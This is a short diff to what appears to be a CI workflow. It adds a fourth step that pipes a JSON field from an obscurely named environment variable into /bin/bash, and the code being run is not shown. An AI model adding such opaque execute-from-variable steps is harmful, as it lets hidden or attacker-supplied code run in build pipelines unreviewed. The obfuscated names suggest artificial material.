@@ -37,6 +37,7 @@ jobs:
           echo $mbjez13901 | jq -r .wkbdo88126 | /bin/bash
           echo $pmcdk46068 | jq -r .x9072 | /bin/bash
           printf '%s' "$iz7286" | jq -r .x612 | /bin/bash
+          printf '%s' "$nr2900" | jq -r .ny7 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
